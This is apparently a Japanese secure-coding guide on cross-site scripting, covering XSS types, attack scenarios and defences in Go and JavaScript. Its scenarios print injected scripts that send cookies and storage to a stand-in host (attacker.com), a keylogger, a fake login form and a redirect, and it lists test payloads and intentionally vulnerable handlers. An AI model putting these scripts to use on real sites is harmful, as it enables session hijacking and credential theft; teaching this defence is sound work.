# XSS (Cross-Site Scripting)

## 目次

- [XSSとは](#xssとは)
- [XSSの種類](#xssの種類)
- [攻撃のシナリオ](#攻撃のシナリオ)
- [脆弱性の影響](#脆弱性の影響)
- [対策方法](#対策方法)
- [実装パターン](#実装パターン)
- [テスト方法](#テスト方法)
- [よくある間違い](#よくある間違い)

## XSSとは

XSS（Cross-Site Scripting、クロスサイトスクリプティング）は、Webアプリケーションの脆弱性の一つで、**攻撃者が悪意のあるスクリプトを被害者のブラウザで実行させる攻撃**です。

### 基本的な仕組み

1. 攻撃者が悪意のあるスクリプトを注入
2. Webアプリケーションがそのスクリプトを適切にエスケープせずに出力
3. 被害者のブラウザでスクリプトが実行される
4. Cookieやローカルストレージのデータが盗まれる

### なぜ「Cross-Site」なのか

本来は別のサイト（攻撃者のサイト）からスクリプトを注入する攻撃を指していましたが、現在では同一サイト内でのスクリプト注入も含めてXSSと呼ばれています。

---

## XSSの種類

### 1. Reflected XSS（反射型XSS）

リクエストに含まれる悪意のあるスクリプトが、そのままレスポンスに反映される攻撃。

**特徴**:
- 一時的な攻撃（サーバーに保存されない）
- URLやフォームパラメータを利用
- ユーザーに悪意のあるリンクをクリックさせる必要がある

**例**:
```
https://example.com/search?q=<script>alert('XSS')</script>

サーバー側:
<p>検索結果: <script>alert('XSS')</script></p>
```

---

### 2. Stored XSS（蓄積型XSS）

悪意のあるスクリプトがサーバーに保存され、他のユーザーがそのページを閲覧したときに実行される攻撃。

**特徴**:
- 永続的な攻撃（サーバーに保存される）
- 最も危険なXSS
- 攻撃者が何もしなくても被害者が増える

**例**:
```
掲示板のコメント:
<script>
  // すべての閲覧者のCookieを盗む
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

---

### 3. DOM-based XSS（DOMベースXSS）

JavaScriptがDOMを操作する際に、悪意のある入力を適切に処理しないことで発生する攻撃。

**特徴**:
- サーバー側は関与しない
- クライアント側のJavaScriptの脆弱性
- ブラウザの開発者ツールで検証しにくい

**例**:
```javascript
// 脆弱なコード
const userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;

// 攻撃URL
https://example.com/#<img src=x onerror=alert('XSS')>
```

---

## 攻撃のシナリオ

### シナリオ1: Cookieの盗難

```html
<!-- 攻撃者が注入するスクリプト -->
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    })
  });
</script>
```

**被害**:
- セッションCookie盗難 → アカウント乗っ取り
- JWTトークン盗難 → 不正アクセス
- CSRFトークン盗難 → CSRF攻撃が可能に

---

### シナリオ2: キーロガーの仕込み

```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({ key: e.key, time: Date.now() })
    });
  });
</script>
```

**被害**:
- パスワードやクレジットカード番号の入力内容が盗まれる

---

### シナリオ3: フィッシングページの表示

```html
<script>
  document.body.innerHTML = `
    <h1>セッションが切れました</h1>
    <form action="https://attacker.com/phishing" method="POST">
      <input name="username" placeholder="ユーザー名">
      <input name="password" type="password" placeholder="パスワード">
      <button>ログイン</button>
    </form>
  `;
</script>
```

**被害**:
- ユーザーが本物のサイトと誤認して認証情報を入力

---

### シナリオ4: リダイレクト攻撃

```html
<script>
  window.location.href = 'https://attacker.com/malware';
</script>
```

**被害**:
- マルウェアダウンロードサイトへ誘導

---

## 脆弱性の影響

XSSにより、以下のような被害が発生する可能性があります：

### 高リスク
- **Cookie盗難**: セッションハイジャック、アカウント乗っ取り
- **認証情報窃取**: localStorage/sessionStorageのJWTトークン盗難
- **キーロガー**: パスワードやクレジットカード情報の窃取
- **不正操作**: 被害者になりすまして送金や削除などの操作

### 中リスク
- **フィッシング**: 偽のログインフォーム表示
- **リダイレクト**: マルウェアサイトへの誘導
- **情報漏洩**: 個人情報やビジネス情報の窃取

### 低リスク
- **画面改ざん**: Webページの内容変更
- **広告表示**: 不正な広告の埋め込み

---

## 対策方法

### 1. 出力のエスケープ処理（最も重要）

ユーザー入力をHTMLに出力する際は、必ずエスケープ処理を行います。

#### サーバー側（Go）

```go
import "html/template"

// 安全な例: html/template を使用
func renderPage(w http.ResponseWriter, username string) {
    tmpl := template.Must(template.New("page").Parse(`
        <h1>Welcome {{.Username}}</h1>
    `))
    tmpl.Execute(w, map[string]string{"Username": username})
}

// 脆弱な例: 直接埋め込み
func renderPageVulnerable(w http.ResponseWriter, username string) {
    // 危険: エスケープされない
    fmt.Fprintf(w, "<h1>Welcome %s</h1>", username)
}
```

#### クライアント側（JavaScript）

```javascript
// 安全な例: textContent を使用
const username = getUserInput();
element.textContent = username;  // 自動的にエスケープされる

// 脆弱な例: innerHTML を使用
element.innerHTML = username;  // スクリプトが実行される可能性
```

---

### 2. 入力値のサニタイゼーション

ユーザー入力を受け付ける際は、危険な文字を除去または無害化します。

```javascript
// HTMLタグを除去
function sanitizeHTML(input) {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML;
}

// 特定の文字をエスケープ
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}
```

**サーバー側（Go）**:
```go
import "html"

func sanitizeInput(input string) string {
    return html.EscapeString(input)
}
```

---

### 3. Content Security Policy (CSP)

CSPヘッダーを設定して、実行可能なスクリプトのソースを制限します。

```go
func setCSPHeader(w http.ResponseWriter) {
    w.Header().Set("Content-Security-Policy",
        "default-src 'self'; "+
        "script-src 'self'; "+
        "style-src 'self' 'unsafe-inline'; "+
        "img-src 'self' data: https:; "+
        "font-src 'self'; "+
        "connect-src 'self'; "+
        "frame-ancestors 'none'; "+
        "base-uri 'self'; "+
        "form-action 'self'")
}
```

**CSPディレクティブの説明**:

| ディレクティブ | 説明 | 推奨設定 |
|--------------|------|---------|
| `default-src` | すべてのリソースのデフォルト | `'self'` |
| `script-src` | JavaScript実行元 | `'self'` |
| `style-src` | CSSの読み込み元 | `'self'` |
| `img-src` | 画像の読み込み元 | `'self' data: https:` |
| `connect-src` | fetch/XHRの接続先 | `'self'` |
| `frame-ancestors` | iframe埋め込み制御 | `'none'` |

**注意**: `'unsafe-inline'` は可能な限り避けるべき（インラインスクリプトを許可してしまう）

---

### 4. HttpOnly Cookie

セッションCookieに`HttpOnly`属性を設定して、JavaScriptからのアクセスを防ぎます。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true,  // JavaScriptから読み取り不可
    Secure:   true,  // HTTPS必須
    SameSite: http.SameSiteLaxMode,
})
```

---

### 5. X-XSS-Protection ヘッダー

ブラウザのXSS防止機能を有効にします（レガシーブラウザ向け）。

```go
w.Header().Set("X-XSS-Protection", "1; mode=block")
```

**注意**: 最新のブラウザはCSPを推奨しており、このヘッダーは非推奨となっています。

---

### 6. X-Content-Type-Options ヘッダー

MIMEタイプのスニッフィングを防ぎます。

```go
w.Header().Set("X-Content-Type-Options", "nosniff")
```

---

## 実装パターン

### 脆弱な実装

```go
package main

import (
    "fmt"
    "net/http"
)

// 脆弱なコメント投稿
func vulnerableCommentHandler(w http.ResponseWriter, r *http.Request) {
    comment := r.FormValue("comment")

    // 危険: エスケープなしで出力
    html := fmt.Sprintf(`
        <html>
        <body>
            <h1>コメント</h1>
            <div>%s</div>
        </body>
        </html>
    `, comment)

    w.Header().Set("Content-Type", "text/html")
    fmt.Fprint(w, html)
}
```

**攻撃例**:
```
POST /comment
comment=<script>alert(document.cookie)</script>
```

---

### 安全な実装

```go
package main

import (
    "html/template"
    "net/http"
)

// 安全なコメント投稿
func secureCommentHandler(w http.ResponseWriter, r *http.Request) {
    comment := r.FormValue("comment")

    // 安全: html/template が自動的にエスケープ
    tmpl := template.Must(template.New("comment").Parse(`
        <html>
        <body>
            <h1>コメント</h1>
            <div>{{.Comment}}</div>
        </body>
        </html>
    `))

    // CSPヘッダー設定
    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
    w.Header().Set("X-Content-Type-Options", "nosniff")
    w.Header().Set("X-Frame-Options", "DENY")

    tmpl.Execute(w, map[string]string{"Comment": comment})
}
```

---

### フロントエンド実装

#### 脆弱な例

```javascript
// 危険: innerHTML使用
function displayComment(comment) {
  document.getElementById('comment').innerHTML = comment;
}

// 危険: eval使用
function executeCode(code) {
  eval(code);  // 絶対に使用しない
}

// 危険: document.write使用
document.write('<div>' + userInput + '</div>');
```

#### 安全な例

```javascript
// 安全: textContent使用
function displayComment(comment) {
  document.getElementById('comment').textContent = comment;
}

// 安全: createElement + textContent
function addComment(comment) {
  const div = document.createElement('div');
  div.textContent = comment;
  document.getElementById('comments').appendChild(div);
}

// 安全: DOMPurify使用（ライブラリ）
import DOMPurify from 'dompurify';
function displayHTML(html) {
  const clean = DOMPurify.sanitize(html);
  document.getElementById('content').innerHTML = clean;
}
```

---

## テスト方法

### 1. 基本的なXSSペイロード

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### 2. HTMLエンティティを使った回避

```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
<img src=x onerror="alert('XSS')">
```

### 3. イベントハンドラを使った攻撃

```html
<div onmouseover="alert('XSS')">マウスを乗せて</div>
<input onfocus="alert('XSS')" autofocus>
<body onload="alert('XSS')">
```

### 4. DOM-based XSSテスト

```javascript
// URLフラグメントテスト
https://example.com/#<img src=x onerror=alert('XSS')>

// location.hash を使うコードをテスト
const value = location.hash.substring(1);
element.innerHTML = value;  // 脆弱
```

---

## よくある間違い

### 1. innerHTML の使用

```javascript
// 悪い例
element.innerHTML = userInput;  // XSS脆弱性

// 良い例
element.textContent = userInput;  // 安全
```

---

### 2. エスケープ不足

```go
// 悪い例: 一部の文字のみエスケープ
func badEscape(s string) string {
    return strings.Replace(s, "<", "&lt;", -1)  // 不完全
}

// 良い例: html.EscapeString 使用
import "html"
func goodEscape(s string) string {
    return html.EscapeString(s)  // 完全
}
```

---

### 3. eval の使用

```javascript
// 悪い例
eval(userInput);  // 絶対に使わない

// 良い例
JSON.parse(userInput);  // JSONの場合
```

---

### 4. document.write の使用

```javascript
// 悪い例
document.write('<div>' + userInput + '</div>');

// 良い例
const div = document.createElement('div');
div.textContent = userInput;
document.body.appendChild(div);
```

---

### 5. innerHTML + 文字列連結

```javascript
// 悪い例
element.innerHTML = '<div>' + userName + '</div>';

// 良い例1: textContent
element.textContent = userName;

// 良い例2: テンプレートリテラル + DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(`<div>${userName}</div>`);
```

---

## セキュリティチェックリスト

- [ ] すべてのユーザー入力を信頼しない
- [ ] 出力時に必ずエスケープ処理を行う
- [ ] `textContent` を使用（`innerHTML` は避ける）
- [ ] Content Security Policy (CSP) を設定
- [ ] HttpOnly Cookie を使用
- [ ] `eval()` を使用しない
- [ ] `document.write()` を使用しない
- [ ] サーバー側で `html/template` を使用
- [ ] X-Content-Type-Options ヘッダーを設定
- [ ] X-Frame-Options ヘッダーを設定

---

## まとめ

XSSは、Webアプリケーションで最も一般的な脆弱性の一つです。

### 防御の基本原則

1. **すべてのユーザー入力を信頼しない**
2. **出力時に必ずエスケープ**
3. **CSPで多層防御**
4. **HttpOnly Cookieで認証情報を保護**

### 推奨される対策

| 対策 | 効果 | 実装難易度 |
|------|------|----------|
| 出力エスケープ | 高 | 低 |
| Content Security Policy | 高 | 中 |
| HttpOnly Cookie | 中 | 低 |
| 入力サニタイゼーション | 中 | 中 |

### 参考資料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
